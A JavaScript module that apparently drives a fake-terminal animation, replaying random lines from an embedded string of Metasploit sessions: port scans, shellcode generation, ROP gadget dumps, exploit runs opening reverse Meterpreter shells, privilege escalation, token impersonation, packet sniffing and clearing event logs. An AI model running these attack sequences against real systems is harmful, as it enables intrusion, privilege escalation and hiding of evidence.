\n172.16.194.172  53     udp    dns             open   \n172.16.194.172  53     tcp    dns             open   \n172.16.194.172  69     udp    tftp            open   \n172.16.194.172  80     tcp    www             open   \n172.16.194.172  111    tcp    rpc-portmapper  open   \n172.16.194.172  111    udp    rpc-portmapper  open   \n172.16.194.172  137    udp    netbios-ns      open   \n172.16.194.172  139    tcp    smb             open   \n172.16.194.172  445    tcp    cifs            open   \n172.16.194.172  512    tcp    rexecd          open   \n172.16.194.172  513    tcp    rlogin          open   \n172.16.194.172  514    tcp    rsh             open   \n172.16.194.172  1099   tcp    rmi_registry    open   \n172.16.194.172  1524   tcp                    open   \n172.16.194.172  2049   tcp    rpc-nfs         open   \n172.16.194.172  2049   udp    rpc-nfs         open   \n172.16.194.172  2121   tcp    ftp             open   \n172.16.194.172  3306   tcp    mysql           open   \n172.16.194.172  5432   tcp    postgresql      open   \n172.16.194.172  5900   tcp    vnc             open   \n172.16.194.172  6000   tcp    x11             open   \n172.16.194.172  6667   tcp    irc             open   \n172.16.194.172  8009   tcp    ajp13           open   \n172.16.194.172  8787   tcp                    open   \n172.16.194.172  45303  udp    rpc-status      open   \n172.16.194.172  45765  tcp    rpc-mountd      open   \n172.16.194.172  47161  tcp    rpc-nlockmgr    open   \n172.16.194.172  50410  tcp    rpc-status      open   \n172.16.194.172  52843  udp    rpc-nlockmgr    open   \n172.16.194.172  55269  udp    rpc-mountd      open \n\nmsf > vulns -p 22\n[*] Time: 2012-06-15 18:32:25 UTC Vuln: host=172.16.194.148 name=NSS-10267 refs=\n[*] Time: 2012-06-15 18:32:25 UTC Vuln: host=172.16.194.148 name=NSS-22964 refs=\n[*] Time: 2012-06-15 18:32:25 UTC Vuln: host=172.16.194.148 name=NSS-10881 refs=\n[*] Time: 2012-06-15 18:32:25 UTC Vuln: host=172.16.194.148 name=NSS-39520 refs=\n[*] Time: 2012-06-15 18:32:25 UTC Vuln: host=172.16.194.163 name=NSS-39520 refs=\n[*] Time: 2012-06-15 18:32:25 UTC Vuln: host=172.16.194.163 name=NSS-25221 refs=\n[*] Time: 2012-06-15 18:32:25 UTC Vuln: host=172.16.194.163 name=NSS-10881 refs=\n[*] Time: 2012-06-15 18:32:25 UTC Vuln: host=172.16.194.163 name=NSS-10267 refs=\n[*] Time: 2012-06-15 18:32:25 UTC Vuln: host=172.16.194.163 name=NSS-22964 refs=\n[*] Time: 2012-06-15 18:32:24 UTC Vuln: host=172.16.194.172 name=NSS-39520 refs=\n[*] Time: 2012-06-15 18:32:24 UTC Vuln: host=172.16.194.172 name=NSS-10881 refs=\n[*] Time: 2012-06-15 18:32:24 UTC Vuln: host=172.16.194.172 name=NSS-10267 refs=\n[*] Time: 2012-06-15 18:32:24 UTC Vuln: host=172.16.194.172 name=NSS-22964 refs=\n\nmsf > vulns 172.16.194.172 -p 6667\n[*] Time: 2012-06-15 18:32:23 UTC Vuln: host=172.16.194.172 name=NSS-11156 refs=\n[*] Time: 2012-06-15 18:32:23 UTC Vuln: host=172.16.194.172 name\n\nmsf  exploit(unreal_ircd_3281_backdoor) > exploit\n\n[*] Started reverse double handler\n[*] Connected to 172.16.194.172:6667...\n    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\n[*] Sending backdoor command...\n[*] Accepted the first client connection...\n[*] Accepted the second client connection...\n[*] Command: echo Q4SefN7pIVSQUL2F;\n[*] Writing to socket A\n[*] Writing to socket B\n[*] Reading from sockets...\n[*] Reading from socket B\n[*] B: "Q4SefN7pIVSQUL2F\\r\\n"\n[*] Matching...\n[*] A is input...\nifconfig\neth0      Link encap:Ethernet  HWaddr 00:0c:29:d1:62:80  \n          inet addr:172.16.194.172  Bcast:172.16.194.255  Mask:255.255.255.0\n          inet6 addr: fe80::20c:29ff:fed1:6280/64 Scope:Link\n          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\n          RX packets:290453 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:402340 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:1000 \n          RX bytes:41602322 (39.6 MB)  TX bytes:344600671 (328.6 MB)\n          Interrupt:19 Base address:0x2000 \n\nlo        Link encap:Local Loopback  \n          inet addr:127.0.0.1  Mask:255.0.0.0\n          inet6 addr: ::1/128 Scope:Host\n          UP LOOPBACK RUNNING  MTU:16436  Metric:1\n          RX packets:774 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:774 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:0 \n          RX bytes:343253 (335.2 KB)  TX bytes:343253 (335.2 KB)\n\nid\nuid=0(root) gid=0(root)\n\nmsf > nessus_connect dook:s3cr3t@192.168.1.100\n[-] Warning: SSL connections are not verified in this release, it is possible fo\n[-]          with the ability to man-in-the-middle the Nessus traffic to capture\n[-]          credentials. If you are running this on a trusted network, please p\n[-]          as an additional parameter to this command.\nmsf > nessus_connect dook:s3cr3t@192.168.1.100 ok\n[*] Connecting to https://192.168.1.100:8834/ as dook\n[*] Authenticated\nmsf >\n\n\nmsf > nessus_policy_list\n[+] Nessus Policy List\n\nID  Name       Owner  visability\n--  ----       -----  ----------\n1   the_works  dook   private\n\nmsf >\n\nmsf > nessus_scan_new\n[*] Usage:\n[*]        nessus_scan_new policy id scan name targets\n[*]        use nessus_policy_list to list all available policies\nmsf > nessus_scan_new 1 pwnage 192.168.1.161\n[*] Creating scan from policy number 1, called "pwnage" and scanning 192.168.1.1\n[*] Scan started.  uid is 9d337e9b-82c7-89a1-a194-4ef154b82f624de2444e6ad18a1f\nmsf >\nmsf > nessus_scan_status\n[+] Running Scans\n\nScan ID                                               Name    Owner  Started    \n-------                                               ----    -----  -------    \n9d337e9b-82c7-89a1-a194-4ef154b82f624de2444e6ad18a1f  pwnage  dook   19:39 Sep 2\n\n[*] You can:\n[+]         Import Nessus report to database :     nessus_report_get reportid\n[+]         Pause a nessus scan :             nessus_scan_pause scanid\nmsf > nessus_scan_status\n[*] No Scans Running.\n[*] You can:\n[*]         List of completed scans:         nessus_report_list\n[*]         Create a scan:                   nessus_scan_new policy id scan name\n\nroot@kali:~# msfpescan -D -a 0x767a38f6 umpnpmgr.dll\n[umpnpmgr.dll]\n0x767a38f6 5f5ec3558bec6aff68003c7a7668e427\n00000000 5F                pop edi\n00000001 5E                pop esi\n00000002 C3                ret\n00000003 55                push ebp\n00000004 8BEC              mov ebp,esp\n00000006 6AFF              push byte -0x1\n00000008 68003C7A76        push 0x767a3c00\n0000000D 68                db 0x68\n0000000E E427              in al,0x27\n\nroot@kali:~# msfpescan -p umpnpmgr.dll\n[targetos.umpnpmgr.dll]\n0x79001567 pop eax; pop esi; ret\n0x79011e0b pop eax; pop esi; retn 0x0008\n0x79012749 pop esi; pop ebp; retn 0x0010\n0x7901285c pop edi; pop esi; retn 0x0004\n\nroot@kali:~# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86\nFound 1 compatible encoders\nAttempting to encode payload with 1 iterations of x86/shikata_ga_nai\nx86/shikata_ga_nai succeeded with size 326 (iteration=0)\nx86/shikata_ga_nai chosen with final size 326\nPayload size: 326 bytes\nbuf = ""\nbuf += "\\xda\\xdc\\xd9\\x74\\x24\\xf4\\x5b\\xba\\xc5\\x5e\\xc1\\x6a\\x29"\n\nroot@kali:~# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86\nFound 1 compatible encoders\nAttempting to encode payload with 1 iterations of x86/shikata_ga_nai\nx86/shikata_ga_nai succeeded with size 326 (iteration=0)\nx86/shikata_ga_nai chosen with final size 326\nPayload size: 326 bytes\nnotBuf = ""\nnotBuf += "\\xda\\xd1\\xd9\\x74\\x24\\xf4\\xbf\\xf0\\x1f\\xb8\\x27\\x5a"\n\nroot@kali:~# msfvenom --help-formats \nExecutable formats\nasp, aspx, aspx-exe, dll, elf, elf-so, exe, exe-only, exe-service, exe-small,\nhta-psh, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-net, psh-reflection,\npsh-cmd, vba, vba-exe, vba-psh, vbs, war\nTransform formats \nbash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, \npowershell, ps1, py, python, raw, rb, ruby, sh,\nvbapplication, vbscript\n\nroot@kali:/tmp# msfrop -x metsrv_gadgets metsrv.dll \nCollecting gadgets from metsrv.dll\nFound 4829 gadgets\n\nFound 4829 gadgets total\n\nExporting 4829 gadgets to metsrv_gadgets\nSuccess! gadgets exported to metsrv_gadgets\nroot@kali:/tmp# head -n 10 metsrv_gadgets \nAddress,Raw,Disassembly\n"0x10001098","5ec20c00","0x10001098: pop esi | 0x10001099: ret 0ch | "\n"0x100010f7","5ec20800","0x100010f7: pop esi | 0x100010f8: ret 8 | "\n"0x1000113d","5dc21800","0x1000113d: pop ebp | 0x1000113e: ret 18h | "\n"0x1000117a","5dc21c00","0x1000117a: pop ebp | 0x1000117b: ret 1ch | "\n"0x100011c3","5dc22800","0x100011c3: pop ebp | 0x100011c4: ret 28h | "\n"0x100018b5","5dc20c00","0x100018b5: pop ebp | 0x100018b6: ret 0ch | "\n"0x10002cb4","c00f9fc28d54","0x10002cb4: ror byte ptr [edi], 9fh | 0x10002cb7: r\n"0x10002df8","0483c20483","0x10002df8: add al, -7dh | 0x10002dfa: ret 8304h | "\n"0x10002e6e","080bc20fb6","0x10002e6e: or [ebx], cl | 0x10002e70: ret 0b60fh | "\nroot@kali:/tmp#\n\nmsf auxiliary(fuzz_imap) > run\n\n[*] Connecting to IMAP server 172.16.30.7:143...\n[*] Connected to target IMAP server.\n[*] Authenticating as test with password test...\n[*] Generating fuzzed data...\n[*] Sending fuzzed data, buffer length = 1012\n[*] 0002 LIST () /"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]BBBBCCCC" "PWNED"\n[*] Connecting to IMAP server 172.16.30.7:143...\n[*] Connected to target IMAP server.\n[*] Authenticating as test with password test...\n[*] Authentication failed\n[*] It seems that host is not responding anymore and this is G00D ;)\n[*] Auxiliary module execution completed\nmsf auxiliary(fuzz_imap) >\n\nmsf exploit(surgemail_list) > set PAYLOAD windows/meterpreter/bind_tcp\nPAYLOAD => windows/meterpreter/bind_tcp\nmsf exploit(surgemail_list) > exploit\n\n[*] Connecting to IMAP server 172.16.30.7:143...\n[*] Started bind handler\n[*] Connected to target IMAP server.\n[*] Authenticating as test with password test...\n[*] Sending payload\n[*] Transmitting intermediate stager for over-sized stage...(191 bytes)\n[*] Sending stage (2650 bytes)\n[*] Sleeping before handling stage...\n[*] Uploading DLL (75787 bytes)...\n[*] Upload completed.\n[*] Meterpreter session 1 opened (172.16.30.34:63937 -> 172.16.30.7:4444)\n\nmeterpreter > execute -f cmd.exe -c -i\nProcess 672 created.\nChannel 1 created.\nMicrosoft Windows XP [Version 5.1.2600]\n(C) Copyright 1985-2001 Microsoft Corp.\n\n def exploit\n    buff = "\\x41" * 174\n    buff >> "\\xeb\\x06\\x41\\x41"\n    buff >> [target.ret].pack(\'V\')\n    buff >> "\\xCC" * 2000\n    print_status("Creating \'#{datastore[\'FILENAME\']}\' file ...")\n    file_create(buff)\n end\n\n msf exploit(audacity) > use multi/handler\nmsf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp\nPAYLOAD => windows/meterpreter/reverse_tcp\nmsf exploit(handler) > set LHOST 192.168.2.15\nLHOST => 192.168.2.15\nmsf exploit(handler) > exploit\n\n[*] Handler binding to LHOST 0.0.0.0\n[*] Started reverse handler\n[*] Starting the payload handler...\n[*] Sending stage (718336 bytes)\n[*] Meterpreter session 1 opened (192.168.2.15:4444 -> 192.168.2.109:1445)\n\nmeterpreter >\n\nmsf exploit(a-pdf_wav_to_mp3) > use exploit/multi/handler\nmsf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp\nPAYLOAD => windows/meterpreter/reverse_tcp\nmsf exploit(handler) > set LHOST 192.168.1.101\nLHOST => 192.168.1.101\nmsf exploit(handler) > exploit\n\n[*] Started reverse handler on 192.168.1.101:4444\n[*] Starting the payload handler...\n[*] Sending stage (748544 bytes) to 192.168.1.160\n[*] Meterpreter session 1 opened (192.168.1.101:4444 -> 192.168.1.160:53983) at \n\nmeterpreter > sysinfo\nComputer: XEN-XP-PATCHED\nOS      : Windows XP (Build 2600, Service Pack 3).\nArch    : x86\nLanguage: en_US\nmeterpreter> getuid\nServer username: XEN-XP-PATCHED\\Administrator\nmeterpreter>\n\nmsf exploit(ms10_002_aurora) >\n[*] Sending Internet Explorer "Aurora" Memory Corruption to client 192.168.1.161\n[*] Sending stage (748544 bytes) to 192.168.1.161\n[*] Meterpreter session 3 opened (192.168.1.71:38699 -> 192.168.1.161:4444) at 2\n\nmsf exploit(ms10_002_aurora) > sessions -i 3\n[*] Starting interaction with 3...\n\nmeterpreter > getuid\nServer username: XEN-XP-SP2-BARE\\victim\nmeterpreter >\nmeterpreter > background\n[*] Backgrounding session 1...\nmsf exploit(ms10_002_aurora) > use exploit/windows/local/\nuse exploit/windows/local/bypassuac\nuse exploit/windows/local/bypassuac_injection\nuse exploit/windows/local/ms10_015_kitrap0d\nuse exploit/windows/local/ms10_092_schelevator\nuse exploit/windows/local/ms11_080_afdjoinleaf\nuse exploit/windows/local/ms13_005_hwnd_broadcast\nuse exploit/windows/local/ms13_081_track_popup_menu\nmsf exploit(ms10_002_aurora) >\n\nmsf exploit(ms10_002_aurora) > use exploit/windows/local/ms10_015_kitrap0d\nmsf exploit(ms10_015_kitrap0d) > set SESSION 1\nmsf exploit(ms10_015_kitrap0d) > set PAYLOAD windows/meterpreter/reverse_tcp\nmsf exploit(ms10_015_kitrap0d) > set LHOST 192.168.1.161\nmsf exploit(ms10_015_kitrap0d) > set LPORT 4443\nmsf exploit(ms10_015_kitrap0d) > show options\n\nModule options (exploit/windows/local/ms10_015_kitrap0d):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   SESSION  1                yes       The session to run this module on.\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (accepted: seh, thread, p\n   LHOST     192.168.1.161    yes       The listen address\n   LPORT     4443             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Windows 2K SP4 - Windows 7 (x86)\n\nmsf exploit(ms10_015_kitrap0d) > exploit\n\n[*]  Started reverse handler on 192.168.1.161:4443 \n[*]  Launching notepad to host the exploit...\n[+]  Process 4048 launched.\n[*]  Reflectively injecting the exploit DLL into 4048...\n[*]  Injecting exploit into 4048 ...\n[*]  Exploit injected. Injecting payload into 4048...\n[*]  Payload injected. Executing exploit...\n[+]  Exploit finished, wait for (hopefully privileged) payload execution to comp\n[*]  Sending stage (769024 bytes) to 192.168.1.71\n[*]  Meterpreter session 2 opened (192.168.1.161:4443 -> 192.168.1.71:49204) at \n\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter >\n\nmsf exploit(warftpd_165_user) > exploit\n\n[*] Handler binding to LHOST 0.0.0.0\n[*] Started reverse handler\n[*] Connecting to FTP server 172.16.104.145:21...\n[*] Connected to target FTP server.\n[*] Trying target Windows 2000 SP0-SP4 English...\n[*] Transmitting intermediate stager for over-sized stage...(191 bytes)\n[*] Sending stage (2650 bytes)\n[*] Sleeping before handling stage...\n[*] Uploading DLL (75787 bytes)...\n[*] Upload completed.\n[*] Meterpreter session 2 opened (172.16.104.130:4444 -> 172.16.104.145:1246)\n\nmeterpreter > irb\n[*] Starting IRB shell\n[*] The \'client\' variable holds the meterpreter client\n>> log = client.sys.eventlog.open(\'system\')\n=> #>#:0xb6779424 @client=#>, #>, #\n\nmsf exploit(warftpd_165_user) > exploit\n\n[*] Handler binding to LHOST 0.0.0.0\n[*] Started reverse handler\n[*] Connecting to FTP server 172.16.104.145:21...\n[*] Connected to target FTP server.\n[*] Trying target Windows 2000 SP0-SP4 English...\n[*] Transmitting intermediate stager for over-sized stage...(191 bytes)\n[*] Sending stage (2650 bytes)\n[*] Sleeping before handling stage...\n[*] Uploading DLL (75787 bytes)...\n[*] Upload completed.\n[*] Meterpreter session 1 opened (172.16.104.130:4444 -> 172.16.104.145:1253)\n\nmeterpreter > run clearlogs\nClearing Event Logs, this will leave an event 517\n[*] Clearing the security Event Log\n[*] Clearing the system Event Log\n[*] Clearing the application Event Log\n[*] Clearing the directory service Event Log\n[*] Clearing the dns server Event Log\n[*] Clearing the file replication service Event Log\nAll Clear! You are a Ninja!\nmeterpreter > exit\n\nmsf > use exploit/windows/smb/ms08_067_netapi\nmsf exploit(ms08_067_netapi) > set RHOST 10.211.55.140\nRHOST => 10.211.55.140\nmsf exploit(ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp\nPAYLOAD => windows/meterpreter/reverse_tcp\nmsf exploit(ms08_067_netapi) > set LHOST 10.211.55.162\nLHOST => 10.211.55.162\nmsf exploit(ms08_067_netapi) > set LANG english\nLANG => english\nmsf exploit(ms08_067_netapi) > show targets\n\nmsf exploit(ms08_067_netapi) > set TARGET 8\ntarget => 8\nmsf exploit(ms08_067_netapi) > exploit\n\n[*] Handler binding to LHOST 0.0.0.0\n[*] Started reverse handler\n[*] Triggering the vulnerability...\n[*] Transmitting intermediate stager for over-sized stage...(191 bytes)\n[*] Sending stage (2650 bytes)\n[*] Sleeping before handling stage...\n[*] Uploading DLL (75787 bytes)...\n[*] Upload completed.\n[*] Meterpreter session 1 opened (10.211.55.162:4444 -> 10.211.55.140:1028)\n\nmeterpreter > list_tokens -u\n\nDelegation Tokens Available\n========================================\nNT AUTHORITY\\LOCAL SERVICE\nNT AUTHORITY\\NETWORK SERVICE\nNT AUTHORITY\\SYSTEM\nSNEAKS.IN\\Administrator\n\nImpersonation Tokens Available\n========================================\nNT AUTHORITY\\ANONYMOUS LOGON\n\nmeterpreter > impersonate_token SNEAKS.IN\\\\Administrator\n[+] Delegation token available\n[+] Successfully impersonated user SNEAKS.IN\\Administrator\nmeterpreter > getuid\nServer username: SNEAKS.IN\\Administrator\nmeterpreter >\n\nmeterpreter > shell\nProcess 2804 created.\nChannel 1 created.\nMicrosoft Windows XP [Version 5.1.2600]\n(C) Copyright 1985-2001 Microsoft Corp.\n\nC:\\WINDOWS\\system32> whoami\nwhoami\nSNEAKS.IN\\administrator\n\nmsf > use exploit/windows/smb/ms08_067_netapi\nmsf exploit(ms08_067_netapi) > set PAYLOAD windows/meterpeter/reverse_tcp\nmsf exploit(ms08_067_netapi) > set LHOST 10.211.55.126\nmsf exploit(ms08_067_netapi) > set RHOST 10.10.1.119\nmsf exploit(ms08_067_netapi) > exploit\n\n[*] Handler binding to LHOST 0.0.0.0\n[*] Started reverse handler\n[*] Triggering the vulnerability...\n[*] Transmitting intermediate stager for over-sized stage...(216 bytes)\n[*] Sending stage (205824 bytes)\n[*] Meterpreter session 1 opened (10.10.1.4:4444 -> 10.10.1.119:1921)\n\nmeterpreter > sniffer_start 2\n[*] Capture started on interface 2 (50000 packet buffer)\n\nmeterpreter > sniffer_dump 2 /tmp/all.cap\n[*] Dumping packets from interface 2...\n[*] Wrote 19 packets to PCAP file /tmp/all.cap\n\nmeterpreter > sniffer_stats 2\n[*] Capture statistics for interface 2\n        packets: 4632\n        bytes: 1978363\n\nmeterpreter > sniffer_dump 2 /tmp/all.cap\n[*] Flushing packet capture buffer for interface 2...\n[*] Flushed 5537 packets (3523012 bytes)\n[*] Downloaded 014% (524288/3523012)...\n[*] Downloaded 029% (1048576/3523012)...\n[*] Downloaded 044% (1572864/3523012)...\n[*] Downloaded 059% (2097152/3523012)...\n[*] Downloaded 074% (2621440/3523012)...\n[*] Downloaded 089% (3145728/3523012)...\n[*] Downloaded 100% (3523012/3523012)...\n[*] Download completed, converting to PCAP...\n[-] Corrupted packet data (length:10359)\n[*] PCAP file written to /tmp/all.cap\n\nmeterpreter > sniffer_stop 2\n[*] Capture stopped on interface 2\n[*] There are 279 packets (57849 bytes) remaining\n[*] Download or release them using \'sniffer_dump\' or \'sniffer_release\'\n\nmeterpreter > sniffer_release 2\n[*] Flushed 279 packets (57849 bytes) from interface 2\nmeterpreter >\n\nmeterpreter > ipconfig\n\nCitrix XenServer PV Ethernet Adapter\nHardware MAC: 22:73:ff:12:11:4b\nIP Address  : 10.1.13.2\nNetmask     : 255.255.255.0\n\nMS TCP Loopback interface\nHardware MAC: 00:00:00:00:00:00\nIP Address  : 127.0.0.1\nNetmask     : 255.0.0.0\n\nmeterpreter >\n';

const msf = {
  numCols: 81,
  get streams() {
    return [
      {
        get title() {
          delete this.title;
          const titles = ["msf", "meterpreter"];
          return (this.title = randomItemFromArray(titles));
        },

        get stream() {
          delete this.stream;
          return (this.stream = randomLineRepeatedString(stream));
        },

        get dt() {
          delete this.dt;
          return (this.dt = 81 * 10);
        },
      },
    ];
  },
};

export default msf;
